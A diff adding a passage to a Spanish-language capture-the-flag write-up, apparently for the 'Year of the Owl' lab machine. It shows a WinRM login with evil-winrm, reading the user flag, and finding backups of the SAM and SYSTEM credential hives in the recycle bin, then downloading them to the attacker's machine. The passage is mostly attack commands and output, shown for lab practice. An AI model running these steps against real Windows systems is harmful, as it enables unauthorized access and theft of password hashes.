@@ -251,6 +251,82 @@ Enunciado :
         WINRM       10.10.121.136   5985   YEAR-OF-THE-OWL  [+] year-of-the-owl\jareth:sa--- (Pwn3d!)       
    
         
+## Obtenemos sesion en la maquina victima mediante WinRM.
+
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/year_ofthe_owl]
+    └─# evil-winrm -i 10.10.38.87 -u jareth -p sa---
+                                            
+    Evil-WinRM shell v3.5
+                                            
+    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                            
+    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                            
+    Info: Establishing connection to remote endpoint
+    *Evil-WinRM* PS C:\Users\Jareth\Documents> whoami
+    year-of-the-owl\jareth
+
+-Leemos la flag de usuario
+
+    *Evil-WinRM* PS C:\Users\Jareth\Desktop> type user.txt
+    THM{Y2I0N------------I2Y2U4M2IwZTBl}
+
+## Elevamos privilegios NT Authority\SYSTEM
+
+ Despues de un buen rato buscando y buscando, pudimos encontrar en la papelera un backup de los ficheros (SAM y SYSTEM)
+
+    Archivo SAM (Security Account Manager):
+    El archivo SAM almacena la información de las cuentas de usuario locales en un sistema Windows.
+    Esto incluye nombres de usuario y las contraseñas en forma de hashes (representaciones cifradas de las contraseñas).
+
+    Archivo SYSTEM
+    El archivo "system" contiene suficiente información para descifrar los secretos de SAM y los secretos de LSA.
+
+1) Obtenemos el SID del usuario actual en este caso jareth que es lo que nos interesa.
+    
+      *Evil-WinRM* PS C:\Users\Jareth\Desktop> whoami /user
+
+      USER INFORMATION
+      ----------------
+      
+      User Name              SID
+      ====================== =============================================
+      year-of-the-owl\jareth S-1-5-21-1987495829-1628902820-919763334-1001
+  
+2) Obtenemos el cotenido de su papelera de reciclaje.
+
+      *Evil-WinRM* PS C:\Users\Jareth\Desktop> cd 'c:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'\
+  
+      
+      *Evil-WinRM* PS C:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> dir
+
+        Mode                LastWriteTime         Length Name
+        ----                -------------         ------ ----
+        -a----        9/18/2020   7:28 PM          49152 sam.bak
+        -a----        9/18/2020   7:28 PM       17457152 system.bak
+
+  3) Nos descargamos los dos ficheros a nuestra maquina.
+
+    *Evil-WinRM* PS C:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> cp sam.bak c:\temp\sam.bak
+     
+    *Evil-WinRM* PS C:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> cp system.bak c:\temp\system.bak
+
+    *Evil-WinRM* PS C:\temp> download sam.bak /home/kali/Desktop/ctf/try_ctf/year_ofthe_owl/content/sam.bak
+                                            
+    Info: Downloading C:\temp\sam.bak to /home/kali/Desktop/ctf/try_ctf/year_ofthe_owl/content/sam.bak                                    
+    Info: Download successful!
+    
+    *Evil-WinRM* PS C:\temp> download system.bak /home/kali/Desktop/ctf/try_ctf/year_ofthe_owl/content/system.bak
+                                            
+    Info: Downloading C:\temp\system.bak to /home/kali/Desktop/ctf/try_ctf/year_ofthe_owl/content/system.bak
+    Info: Download successful!
+
+
+
+  
+
+    
+
 
           
 
